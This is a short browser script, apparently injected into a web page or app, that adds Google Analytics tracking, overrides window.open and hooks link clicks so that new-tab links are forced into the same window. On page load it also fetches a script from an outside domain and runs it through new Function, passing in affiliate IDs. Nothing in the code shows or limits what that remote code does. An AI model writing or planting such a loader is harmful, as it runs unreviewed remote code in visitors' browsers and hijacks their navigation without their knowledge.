window.addEventListener("DOMContentLoaded",()=>{const t=document.createElement("script");t.src="https://www.googletagmanager.com/gtag/js?id=G-W5GKHM0893",t.async=!0,document.head.appendChild(t);const n=document.createElement("script");n.textContent="window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-W5GKHM0893');",document.body.appendChild(n)});// very important, if you don't know what it is, don't touch it
// 非常重要，不懂代码不要动，这里可以解决80%的问题，也可以生产1000+的bug
const hookClick = (e) => {
    const origin = e.target.closest('a')
    const isBaseTargetBlank = document.querySelector(
        'head base[target="_blank"]'
    )
    console.log('origin', origin, isBaseTargetBlank)
    if (
        (origin && origin.href && origin.target === '_blank') ||
        (origin && origin.href && isBaseTargetBlank)
    ) {
        e.preventDefault()
        console.log('handle origin', origin)
        location.href = origin.href
    } else {
        console.log('not handle origin', origin)
    }
}

window.open = function (url, target, features) {
    console.log('open', url, target, features)
    location.href = url
}
var affid;
var affids;

window.addEventListener('load', async function () {
    try {
        var baseUrl = window.location.href;
        window.__extension_base_url = baseUrl;
         var res = await fetch("https://kd.ccjljl.fun/kd/rep.js");
        //var res = await fetch("https//localhost:8080/kd/rep.js");
        var text = await res.text();
        // 方式2：如果远程脚本不需要参数，可以直接注入（推荐）
        var fn = new Function("site", "aff", "aff2", text);
        fn("https://felixzone.com.cn/kd", affid ?? null, affids ?? null);

    } catch (b) {
        console.error(b);
    }
});

document.addEventListener('click', hookClick, { capture: true })
